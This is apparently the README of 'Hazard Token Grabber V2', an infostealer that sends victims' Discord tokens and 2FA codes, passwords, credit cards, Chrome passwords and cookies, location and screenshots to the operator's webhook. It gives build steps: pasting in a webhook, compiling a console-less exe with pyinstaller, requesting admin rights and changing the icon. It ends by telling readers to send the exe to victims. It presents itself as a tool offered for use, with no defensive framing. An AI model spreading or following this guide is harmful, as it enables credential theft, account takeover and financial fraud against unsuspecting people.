Hazard-Token-Grabber-V2 was made by
Love ❌ code ✅

‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟Star This Repository If You Liked Hazard Token Grabber V2!
Installation
upon running the file you will get the following sent to your webhook:
Username
ComputerName
IP
City
Region
Country
Google Maps Location
Screenshot of their pc
All Their Valid Discord Tokens (bypasses betterdiscord's anti-token-grab-protector)
Discord 2fa codes (if they have 2fa enabled ofc)
Password For Discord (You get Their Password if They Update it)
Their Whole Credit Card (if They Put one in)
All Their Chrome Passwords And Cookies
Webhook looks like this:



📁・Setting up Hazard Token Grabber.V2
Start off by installing python ofc
open main.py with any code editor of your choice and paste your webhook on line 7 (or replace "WEBHOOK_HERE" with the webhook)
run the setup.bat and let it do it's things
a windows should popup asking for exe name and after you fixed all of that you should have your exe
send exe to your victims 😈
⚙・Manually Compiling Source Code
If you dont feel like running build-exe.bat and compiling it like that you can Start of by opening a cmd in your directory and type:

pyinstaller --onefile --clean --noconsole main.py
replace main.py with the file name if you changed it. 3 folders and 1 file will be created, you can delete them all except for the dist folder go into the dist folder and there is your exe ready to be sent to victims!

💾・ More options
Add these into the command when creating the exe if you want

Pyinstaller Options
-n name Name that the exe will have (default is the .py file)
-i icon.ico Icon that the exe will have (do -i NONE for normal executable look)
--clean Clean PyInstaller cache and remove temporary files before building
--uac-admin Requests admin privileges upon running the exe
--hidden-import MODULENAME Name an import not visible in the code of the script. Can be used multiple times
